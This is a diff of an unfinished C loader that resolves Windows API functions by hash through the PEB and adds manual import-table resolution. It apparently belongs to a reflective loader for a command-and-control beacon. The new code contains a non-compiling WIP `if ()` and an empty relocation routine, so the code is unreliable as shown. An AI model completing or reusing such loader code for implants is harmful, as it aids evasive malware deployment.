@@ -1,5 +1,4 @@
 #include "Ldr.h"
-#include "Macros.h"
 #include "Ntdll.h"
 #include "Constexpr.h"
 
@@ -29,7 +28,7 @@ FUNC PVOID LdrModulePeb(_In_ ULONG moduleHash) {
     return NULL;
 }
 
-FUNC PIMAGE_NT_HEADERS LdrImgNtHeaders(_In_ PVOID image) {
+FUNC PIMAGE_NT_HEADERS LdrpImgNtHeaders(_In_ PVOID image) {
     PIMAGE_DOS_HEADER pImgDosHdr = NULL;
     PIMAGE_NT_HEADERS pImgNtHdrs = NULL;
 
@@ -62,7 +61,7 @@ FUNC PVOID LdrFunction(_In_ PVOID module, _In_ ULONG functionHash) {
     }
 
     // Fetch module NT headers
-    if (!(ntHeader = LdrImgNtHeaders(module))) {
+    if (!(ntHeader = LdrpImgNtHeaders(module))) {
         return NULL;
     }
 
@@ -85,8 +84,63 @@ FUNC PVOID LdrFunction(_In_ PVOID module, _In_ ULONG functionHash) {
         address = C_PTR(U_PTR(module) + addrFuncs[addrOrdns[i]]);
 
         // Edge case: forwarded functions... likely don't need them
+        // https://devblogs.microsoft.com/oldnewthing/20060719-24/?p=30473
         break;
     }
 
     return address;
+}
+
+FUNC SIZE_T StrToWStr(PWCHAR dst, PCHAR src) {
+    INT len = MAX_PATH;
+
+    while (--len >= 0) {
+        if (!(*dst++ = *src++)) {
+            return MAX_PATH - len -1;
+        }
+    }
+    return MAX_PATH - len;
+}
+
+FUNC VOID LdrResolveIAT(PINSTANCE pInstance, PVOID pMemAddr, PVOID pBaseIat) {
+    PIMAGE_THUNK_DATA           pOrgThunkData   = NULL,
+                                pFirstThunkData = NULL;
+    PIMAGE_IMPORT_DESCRIPTOR    pImgImpDesc     = NULL;
+    PIMAGE_IMPORT_BY_NAME       pImgImpName     = NULL;
+    PCHAR                       pModuleName     = NULL;
+    HMODULE                     hModule         = NULL;
+    PVOID                       pFunction       = NULL;
+    ANSI_STRING                 ansiString      = {0};
+
+    // Loop through IAT
+    for (pImgImpDesc = pBaseIat; pImgImpDesc->Name != 0; ++pImgImpDesc) {
+        pModuleName = C_PTR(pMemAddr + pImgImpDesc->Name);
+        pOrgThunkData = C_PTR(pMemAddr + pImgImpDesc->OriginalFirstThunk);
+        pFirstThunkData = C_PTR(pMemAddr + pImgImpDesc->FirstThunk);
+
+        // Process module name
+        WCHAR wModuleName[MAX_PATH] = {0};
+        StrToWStr(wModuleName, pModuleName);
+
+        // Check if module is already loaded, if not, load it
+        if (!(hModule = LdrModulePeb(HashStringW(&wModuleName)))) {
+            // Module not loaded, lets load it
+            if (!(hModule = pInstance->Win32.LoadLibraryA(pModuleName))) {
+                // Failed to load module... good luck!
+                return;
+            }
+        }
+
+        // Loop through imported functions within this module
+        for (; pOrgThunkData->u1.AddressOfData != 0; ++pOrgThunkData, ++pFirstThunkData) {
+            if (IMAGE_SNAP_BY_ORDINAL(pOrgThunkData->u1.Ordinal)) {
+                // WIP
+                if ()
+            }
+        }
+    }
+}
+
+FUNC VOID LdrRelocateSections(PVOID pMemAddr, PVOID pBeacon, PVOID pBaseReloc) {
+
 }
